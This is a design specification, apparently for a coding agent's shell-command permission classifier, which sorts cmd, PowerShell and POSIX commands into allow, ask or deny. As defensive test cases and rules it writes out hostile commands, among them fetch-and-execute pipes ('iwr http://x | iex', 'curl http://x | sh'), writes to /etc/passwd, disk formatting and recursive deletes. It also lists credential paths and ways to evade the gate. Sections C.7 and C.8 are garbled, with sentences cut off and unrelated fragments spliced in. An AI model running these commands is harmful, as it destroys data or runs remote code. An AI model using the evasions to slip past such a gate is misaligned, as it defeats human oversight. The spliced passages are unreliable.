### A.3 What the cmd tokenizer parses vs. what is unparsed → ASK

**Parsed:**

- Character-level lexing of the operators `&` `&&` `||` `|` `<` `>` `>>` and
  the numbered forms `N>` `N>>` `N>&M`, **with no whitespace requirement**
  (F7/F25), outside `"` and not preceded by `^`.
- `"…"` quoting: contents are literal, operators inside do not split, `""` is a
  literal quote.
- `^X` outside quotes consumes `X` literally, so `echo a^&b` is ONE statement.
  `^` at end of line joins the next line.
- Leading `@` on a statement is stripped, then the statement is classified.
- Command name = first non-operator token, casefolded, `.exe`/`.com`/`.bat`/
  `.cmd` stripped, path stripped to basename via `shell_basename`.
- Switches = tokens matching `^[/-][A-Za-z0-9?+]`, casefolded, matched against
  per-command tables. `/o:x` and `-o:x` split at the first `:`.

**Unparsed → ASK, each an explicit early return, never a fallthrough:**

- Any `%` or `!` anywhere in the statement.
- Any `(` or `)`.
- Any unbalanced `"`.
- `^`, `"`, `%` or `!` inside the command-name token (F11).
- A statement whose first token is an operator (F28).
- The names `for if call goto start setlocal endlocal pushd popd rem :: exit`.
- A statement with zero tokens.
- Any byte the lexer cannot classify.
- A catch-all `except Exception: return Verdict.ASK` at the module entry point.

### B.6 `_classify_dialect_read_only` — matching rules, and the UNKNOWN rule

```python
def _classify_dialect_read_only(command, name, dialect) -> Verdict:
    """ALLOW iff every argument is a token this DIALECT's grammar calls
    read-only (#204).

    Replaces the ``_READ_ONLY_ONLY_WHEN_BARE`` narrowing of ``0be16cd``, which
    keyed on token SHAPE — ``-``-leading is a flag, ``/``-leading writes —
    rather than on either dialect's switch syntax, and was measured wrong both
    ways on POSIX against ``main`` c6d424c: ``sort -o out.txt``,
    ``sort -oout.txt``, ``sort --output=out.txt``, ``sort --output out.txt``,
    ``date --set=2030-01-01`` and ``hostname -b`` all returned ALLOW while
    mutating, and ``sort /etc/hosts`` returned ASK while reading.
    """
```

1. Casefold. Normalise every dash codepoint to ASCII `-` (F1 applies here too;
   a POSIX shell does not, but the classifier must not answer differently for a
   string it cannot prove is ASCII).
2. `None` literal (dynamic) → ASK.
3. A token whose first character is not a sigil of this dialect is a
   **positional**: ASK if this (name, dialect)'s `positional` is MUTATING, else
   continue. `date`'s `+`-leading form is read-only under every dialect (pinned
   `date +%Y`; under cmd it is a malformed `MM-DD-YYYY` that cmd rejects, so
   the worst case is an error, not a mutation).
4. `--long` splits at the first `=`. In `long_write` or `long_exec` → ASK. In
   `long_ok` → continue. Otherwise → ASK.
5. `-abc` under a `-` sigil is a **cluster**. Walk it left to right: a char in
   `short_write` → ASK; a char in `short_value` consumes the remainder of the
   token as its value and the cluster ends; a char in `short_bool` continues;
   anything else → ASK. This is what catches `-oout.txt` (measured ALLOW today)
   and admits `-k2` and `-Iseconds` (both measured ALLOW today, both preserved).
6. `/x` under a `/` sigil: in `switches_write` → ASK; in `switches_ok` →
   continue; else ASK.
7. **`Dialect.UNKNOWN`**: a token is refused if it is a write/exec switch under
   **any** dialect, and accepted if it is read-only under **at least one** and
   refused by none. Sigils are the union `-/`. This is ADR-0158's
   strictest-wins, and it is what preserves every pin.

**Derivation of all eight pins under the default UNKNOWN** — none may be edited
(`tests/builtin/test_bash_classifier.py:43-50`):

| pinned case | today | rule | after |
| --- | --- | --- | --- |
| `date 01-01-2030` | ASK | positional, MUTATING under POSIX(BSD)/CMD | ASK ✓ |

| `sort in.txt` | ALLOW | positional INPUT_FILE | ALLOW ✓ |

## C. PowerShell classifier (`powershell.py`)

### C.1 Walk

Mirrors `_walk`: fold over children with `fold()` (§E), `stage_index` for
pipeline position, fail-safe ASK on `has_error`, on any exception, and on
`_PS_PARSER is None`.

**A tree with zero `command` nodes is ASK, never ALLOW.** Measured: `$x` →
`has_error=False`, zero command nodes. `max`'s identity is ALLOW and that is
exactly the wrong default here, so the empty case is special-cased before the
fold.

### C.2 Statement-level taints (whole command → ASK)

`stop_parsing` (`--%`), `function_statement`, and any of
`set-alias`/`new-alias`/`sal`/`nal` present anywhere: ASK for the entire
command. They rebind names the tables are about to trust, or stop the parser.

### C.3 Node traps (F29 corrected)

- `invokation_expression`, `cast_expression`, `type_literal` anywhere → ASK.
- `member_access` whose base resolves to a `type_literal` → ASK.
- `member_access` on a variable (`$_.Length`) is **not** a trap. Measured:
  `Where-Object { $_.Length -gt 10 }` contains one and is idiomatic; trapping
  it kills the two ALLOW entries that justify descending into script blocks.
  `% { $_.Delete() }` is an `invokation_expression` and is caught by the rule
  above.
- `::Start` / `::Load` / `::Run` / `::Invoke` / `::LoadWithPartialName` on a
  `type_literal` naming `System.Diagnostics.Process`,
  `System.Reflection.Assembly`, `System.Net.WebClient` → DENY.
- `command_invokation_operator` (`&`, `.`) whose name expression resolves to
  `None` (`& $cmd`, `& ('r'+'m')`) → ASK.
- `script_block` bodies ARE walked and folded at `stage_index=0`.

### C.4 Pipeline stage index (F14, the draft was inverted)

Measured shapes:

```
'iwr http://x | iex'  -> pipeline > pipeline_chain > [command, |(ANON), command]
'a && b || c'         -> pipeline > [pipeline_chain, pipeline_chain_tail('&&'),
                                     pipeline_chain, pipeline_chain_tail('||'),
                                     pipeline_chain]
```

Rule: within one `pipeline_chain`, `stage_index` of a `command` is the number
of anonymous `|` token children that precede it. A `pipeline_chain_tail`
(`&&`/`||`) starts a new chain at `stage_index = 0` — sequencing, not piping;
`a && iex` is not fetch-and-execute. `;` and newline yield sibling `pipeline`
nodes, each at 0. Pin `iwr http://x | iex` → stage 1 with a direct unit test on
the stage helper, so the inversion cannot silently return.

### C.5 Name and parameter normalisation

`_ps_arg_text(node)`: text → strip backticks (F26) → normalise U+2013/2014/2015
to `-` (F1) → casefold.

`_ps_literal(node)`: `string_literal`/`verbatim_string_characters` → contents;
`expandable_string_literal` containing a `variable` → `None`;
`generic_token`/`command_name` → text; `variable`/`sub_expression`/
`parenthesized_expression` → `None`.

`_ps_normalize(name)`: `_ps_arg_text` → strip surrounding quotes (measured:
`& 'Remove-Item' x` yields `"'Remove-Item'"` **with** quotes) → strip path via
`shell_basename` → strip `.exe` → resolve through `_PS_ALIASES`.

**Parameter matching.** A token is a parameter if it is a `command_parameter`
node **or** a `generic_token` whose normalised text starts with `-` (F1).
PowerShell resolves any unambiguous case-insensitive prefix
(`MergedCommandParameterMetadata.cs:469`, ambiguity check `:508`, v7.4.6), and
the classifier cannot prove unambiguity, so:

```python
def _param_ok(param: str) -> bool:
    """Accepted only if it prefixes something read-only and nothing capable."""
    return (any(a.startswith(param) for a in _PS_PARAM_ALLOW)
            and not any(d.startswith(param) for d in _PS_PARAM_CAPABLE))
```

`_PS_PARAM_ALLOW` (one shared table, ~40 entries, no per-cmdlet duplication):
`path literalpath filter include exclude recurse force name depth first last
skip totalcount head tail raw encoding delimiter pattern simplematch
casesensitive notmatch allmatches context list algorithm property
expandproperty unique descending stable member group noelement format
inputobject nonewline width autosize wrap errorvariable warningvariable
verbose debug erroraction warningaction informationaction outbuffer
pipelinevariable stream resolve relativebasepath leaf parent qualifier
noqualifier isabsolute childpath additionalchildpath compress depth`

`_PS_PARAM_CAPABLE` — anything that reaches outside the read, checked as a
prefix so `-o` is refused for prefixing both `outbuffer` and `outvariable`:
`outvariable outfile append wait computername session asjob credential online
membername argumentlist scriptblock encodedcommand encodedarguments
executionpolicy command file confirm whatif dynamicparameter usenewenvironment
verb passthru destination value`

`-Path:C:\x` — measured, `-Path` and `:` land in separate nodes, so the colon
form normalises for free. **`-Recurse:$false` disables the switch**: a
parameter followed by `:` and a dynamic value makes any presence test
meaningless → drop out of the DENY branch to **ASK**, never stay in it. Pinned.

### C.7 Redirection (F5)

`redirection → redirected_file_name → generic_token`, measured. Any

matches, else ASK. It is folded with the rest, so it can only raise. This
single rule covers P21–P23 and every future ALLOW-tier addition.

### C.8 `_sensitive_read_target()` (shared, §common.py)

ASK if the normalised literal target: is under `~/.ssh`, `~/.aws`, `~/.gnupg`,
`~/.config/gh`, `~/.docker`, `~/.kube`, `~/.azure`, `~/.terraform.d`,
`$PROFILE`, `~/Documents/PowerShell`, `~/Documents/WindowsPowerShell`; or any
of those, plus `gcloud`, appears as a run of path COMPONENTS anywhere (the
wildcard evasion, and `%APPDATA%\gcloud` which has no `~`-anchored spelling);

an attacker host is an NTLM-relay surface (F3/P15–P17); or it is a provider

credential. Pinned as ALLOW so the exclusion is not re-litigated.

### C.9 Protected write targets and root targets

`_protected_write_target(target)` matches the **union** of the Windows prefix
set and the imported POSIX `_PROTECTED_WRITE_PREFIXES` (F23) — `pwsh` runs on
both.

Windows prefixes:

```
C:\Windows   C:\Windows\System32   C:\Windows\SysWOW64
C:\Windows\System32\drivers\etc    C:\Program Files   C:\Program Files (x86)
C:\ProgramData
…\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
~\Documents\PowerShell   ~\Documents\WindowsPowerShell
~\.ssh  ~\.aws  ~\.config  ~\.gitconfig  .git
```

The last row is what a filesystem-only rule misses: `Set-Content Env:\Path`
mutates the environment; `Set-Content Function:\prompt` rebinds a function.

`_windows_path_matches(target, prefix)` normalises before comparing, because
`str.startswith` is trivially evaded: casefold; `/` → `\`; strip `\\?\` and
`\\.\`; **any component matching `~\d+$` (8.3 short name) → ASK, not a match
attempt** — expanding `C:\PROGRA~1` needs the filesystem; **UNC → ASK
unconditionally**; **drive-relative** (`\Windows\x`) compares against every
prefix's drive-less tail; **any `$env:` / `%VAR%` / `$HOME` → ASK, never
expanded** (`bash_classifier.py:194-196`).

`_is_root_or_protected_target(target)` (F12) — separate from the prefix set,
because `C:\` is in no prefix and is the flagship case:

- `C:\`, `C:`, any `<letter>:\`, `\`, `/`, `~`, `$HOME`, `%USERPROFILE%`;
- `*`, `.`, `..`, `.\*`, `./*`;
- `_protected_write_target(target)`;
- **no target at all** — `Get-ChildItem | Remove-Item -Recurse -Force` deletes
  the working directory recursively and has no target node (measured: two
  commands, the second with only `command_parameter` children).

## D. cmd classifier (`cmd.py`)

### D.1 Splitting

Split on unquoted, unescaped `&` `&&` `||` `|` and newline into statements. `|`
increments `stage_index`; `&`/`&&`/`||`/newline reset it to 0. Fold every
statement. **Any statement the lexer cannot split or tokenize → ASK for the
whole command**, not for that statement alone: a splitter that lost track of
quoting has lost track of where the other statements are, so it may not claim
to have found them all.

### D.2 Lexing (F7/F25)

Character-level. Operators are recognised with **no whitespace requirement**,
outside `"` and not preceded by `^`. Includes `N>`, `N>>`, `N>&M`. So
`type nul>C:\Windows\x` is `type`, `nul`, `>`, `C:\Windows\x`.

### D.3 Command name

First non-operator token. Casefold; strip `.exe`/`.com`/`.bat`/`.cmd`; strip
path via `shell_basename`. If it contains `^`, `"`, `%` or `!` → ASK (F11).

### D.4 The one global gate, then ALLOW (14 rows)

**Before any name lookup:** a statement containing any redirect operator drops
out of the ALLOW tier (F8). Verdict = DENY if `_protected_write_target()`
matches the target, else ASK. This single rule closes C1–C16.

**Then:** every positional literal and every `<` source goes through
`_sensitive_read_target()` (F9) → ASK on a hit. This closes C17–C20.

| name | gate |
| --- | --- |
| `dir` | switches ⊆ `{/a /b /o /p /q /w /x /4 /n /c /-c /l /t}`; no `/s` |
| `type` | ≥1 positional |
| `echo` | any positionals (the redirect rule already removed the write case) |
| `ver` `vol` `whoami` `hostname` | bare, or `whoami /user /groups /priv` |
| `where` | ≥1 positional |
| `findstr` | no `/f:` (reads a file list); no `/g:` |
| `more` | ≥1 positional |
| `tree` | switches ⊆ `{/a /f}` |
| `fc` | ≥1 positional |
| `cd` / `chdir` | zero args, or one positional |
| `set` | exactly one positional, no `=` anywhere. **Bare `set` is ASK** — it dumps every env var, a secret-leak surface. `set FOO=bar` assigns → ASK |
| `date` / `time` | **only with `/t`**. Bare `date` prompts on stdin and blocks forever in a non-tty (`date.md`: "displays the current system date setting and **prompts you to enter a new date**"); `date <value>` sets the clock |
| `sort` | §B.5's CMD grammar: no `/o`, no `/t`, no unknown switch |

`find` and `comp` are **removed** from ALLOW (F10). `systeminfo` is ASK, listed
explicitly: read-only, but it dumps domain membership, hotfix inventory and
network configuration, and it is slow enough to be worth a human seeing.

### D.5 DENY

`del`/`erase` **with `/s`**; `rd`/`rmdir` **with `/s`**; `format`; `diskpart`;
`cipher /w`; `shutdown`; `reg` with `add`/`delete`/`import`/`copy`/`restore`/
`load` when the key is under `HKLM` (`reg query`/`compare`/`export`/`save` are
ASK — `export`/`save` write a file); `icacls` and `takeown` per F15;
`schtasks /create`; `date <value>` / `time <value>` (a positional that is not
`/t`); a redirect target under a protected prefix; any statement at
`stage_index > 0` whose name is `cmd powershell pwsh sh bash wsl`.

`del x` / `erase x` without `/s` → **ASK** (F13), consistent with
`Remove-Item build\out.js`. Not a regression: ASK today.

`net user … /add`, `net localgroup … /add`, `sc create|config|delete`,
`setx … /M`, `mklink`, `robocopy … /MIR`, `xcopy`, `attrib +h` → **ASK**. Each
is a real mutation, but each has a legitimate agent use and none is
categorically unrecoverable in the way `format`/`diskpart` are.

### D.6 ASK

Everything else, plus these as explicit entries: `for if call goto start
setlocal endlocal pushd popd exit rem :: assoc ftype path prompt copy move ren
md mkdir rd rmdir` (without `/s`) `reg`-read `tasklist taskkill net sc certutil
bitsadmin wmic curl tar forfiles ping systeminfo find comp`, bare `set`, bare
`date`, bare `time`, and everything in §A.3's unparsed list.

**`for` is ASK unconditionally.** `for.md`, "Parsing output": a back-quoted
`<command>` between the parentheses "is treated as a command line, which is
passed to a child Cmd.exe". There is no `for` shape worth reasoning about —
`for /r %i in (*) do del %i` is a recursive delete with no `del /s` signature.

## E. Composition (`common.py`)

```python
def fold(verdicts: Iterable[Verdict]) -> Verdict:
    """ADR-0158 strictest-wins: the MAX over parts, ASK for NO parts.

    NOT ``max(verdicts, default=Verdict.ALLOW)``. ``max``'s identity is ALLOW
    and an empty part list is exactly the case that must not be permissive:
    measured, PowerShell ``$x`` parses clean with ZERO command nodes, so an
    ALLOW identity auto-runs every expression-only line.
    """
```

PowerShell: `sub_expression` `$( )`, `array_expression` `@( )`,
`script_block_expression` `{ }` and `parenthesized_expression` are walked as
**fresh statements** at `stage_index=0` and folded — the analogue of
`_contains_executable_node`'s re-walk. An unrecognised named node with children
seeds `ASK if it contains any command/invocation node else ALLOW` and folds its
children.

cmd: mis-splitting always errs strict. An over-split produces more parts, each
classified with unknown→ASK, and the fold takes the max. An under-split (two
statements read as one) produces a longer argument list on a known ALLOW name,
and every ALLOW row ASKs on an unrecognised argument, so under-splitting cannot
manufacture an ALLOW either.

## F. Dispatch in `_auto_classify_bash` (`permission.py:633`)

### F.1

```python
@staticmethod
def _auto_classify_bash(args: dict[str, Any]) -> str:
    try:
        from aelix_coding_agent.builtin.bash_classifier import (
            Verdict, classify, is_classifiable_shell,
        )
        from aelix_coding_agent.builtin.shell_classifiers import classify_for_shell
        from aelix_coding_agent.builtin.shell_classifiers.dialect import (
            Dialect, dialect_for_shell,
        )
        from aelix_coding_agent.tools.bash import _resolve_shell
        from aelix_coding_agent.util.shell_env import get_shell_env

        command = _command_from_args(args)
        # Resolve the shell FIRST: the dialect is an INPUT to the verdict, not
        # a filter applied to it afterwards (#204 criterion 1). The missing
        # ``shell_path`` caveat below is unchanged and matters MORE now — a
        # wrong shell no longer picks a wrong gate, it picks a wrong GRAMMAR.
        shell = _resolve_shell(get_shell_env())
        dialect = dialect_for_shell(shell.path)

        if dialect in (Dialect.POWERSHELL, Dialect.CMD):
            # The bash grammar's DENY is kept as a FLOOR, never as a ceiling
            # (#204 criterion 4). Measured on c6d424c, ``classify`` DENYs
            # ``find . -delete``, ``chmod -R 777 /``, ``mkfs.ext4 /dev/sda``,
            # ``curl http://x | sh``, ``echo x > /etc/passwd`` and ``rm ...``
            # — none of which is a name in ``_DENY_COMMANDS``, so importing
            # that frozenset into the dialect tables would have lost them.
            floor = classify(command)
            verdict = max(
                floor if floor is Verdict.DENY else Verdict.ALLOW,
                classify_for_shell(command, shell.path),
            )
            competent = True
        else:
            # POSIX and UNKNOWN keep today's two-step exactly.
            verdict = classify(command, dialect=dialect)
            competent = is_classifiable_shell(shell.path)
    except Exception:  # noqa: BLE001 — any classifier failure → ASK (safe)
        return "ask"

    if verdict == Verdict.DENY:
        return "deny"
    if verdict == Verdict.ALLOW and competent:
        return "allow"
    return "ask"
```

Imports stay **function-local**; they already are, deliberately, and a
top-of-file import here would shift every cited line in `permission.py`.

**§F.32 fallback**: to drop Slice C, change the branch condition to
`dialect is Dialect.POWERSHELL`. CMD then falls to the `else` branch, where
`is_classifiable_shell("cmd.exe")` is False and every ALLOW is downgraded —
today's behaviour exactly. No other edit.

### F.2 Criterion 4, precisely

- `dialect in (POWERSHELL, CMD)`: the dialect classifier may **raise** ASK to
  ALLOW, and may **add** DENYs. It can never lower the bash classifier's DENY.
  The relaxation is therefore exactly "ASK → ALLOW for a shell we can now
  read", which is the loosening #204 authorises, together with its compensating
  control.
- `dialect in (POSIX, UNKNOWN)` — including `fish`, an unresolvable shell, and
  every POSIX shell: byte-identical to today apart from §B's switch-table fix,
  which is a tightening except for `sort /etc/hosts`.

Executable form: `test_deny_is_never_relaxed_by_the_dialect_router` (§G).
